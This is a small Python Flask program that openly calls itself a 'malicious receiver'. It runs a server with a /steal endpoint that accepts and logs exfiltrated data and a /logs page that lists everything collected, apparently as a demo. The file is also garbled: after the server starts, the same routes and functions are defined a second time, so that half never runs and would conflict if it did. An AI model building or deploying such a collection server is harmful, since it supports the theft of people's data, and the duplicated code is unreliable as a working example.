from flask import Flask, request

app = Flask(__name__)

@app.route("/", methods=["GET"])
def home():
    return "Malicious receiver is running."

@app.route("/steal", methods=["POST"])
def steal():
    try:
        stolen_data = request.get_data(as_text=True)  # better than .data.decode()
        print(f"[🚨] Exfiltrated data received: {stolen_data}")
    except Exception as e:
        print(f"⚠️ Error reading data: {e}")
    return '', 204

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=9000)

    # Global storage (for demo only)
stolen_logs = []

@app.route("/steal", methods=["POST"])
def steal():
    stolen_data = request.get_data(as_text=True)
    print(f"[🚨] Exfiltrated data received: {stolen_data}")
    stolen_logs.append(stolen_data)
    return '', 204

@app.route("/", methods=["GET"])
def home():
    return "<h1>Malicious receiver is running</h1>"

@app.route("/logs", methods=["GET"])
def logs():
    if not stolen_logs:
        return "No data received yet."
    return "<br>".join(stolen_logs)